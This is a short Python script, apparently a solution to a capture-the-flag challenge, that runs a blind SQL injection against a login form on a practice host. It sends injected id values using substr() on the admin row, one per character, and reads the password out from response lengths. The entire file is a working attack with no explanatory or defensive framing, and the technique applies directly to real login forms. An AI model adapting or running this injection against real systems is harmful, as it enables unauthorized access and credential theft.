import urllib.request
import urllib.parse

def httpRequest(id, pw):
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    req = {'id':id, 'pass': pw}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    params = urllib.parse.urlencode(req)
    params = params.encode('ascii')
    req = urllib.request.Request(url, params)
    # print(req)
    with urllib.request.urlopen(req) as res:
        data = res.read()
    return data
def atkpw(plen):

	flag = ''

	for p in range(0, plen):
		for i in range(48, 123):
			char = chr(i)
			id = "admin' AND substr((SELECT pass FROM user WHERE id='admin'), " + str(p + 1) + ", 1) = " + "'" + char + "'" + " ; --"
			pw = "''"

			data = httpRequest(id, pw)

			if len(data) > 2000:
				print(str(i) + ": " + char)
				flag = flag + char
				print(flag)
				break

	return flag
if __name__ == '__main__':
    plen = 21
    print(atkpw(plen))
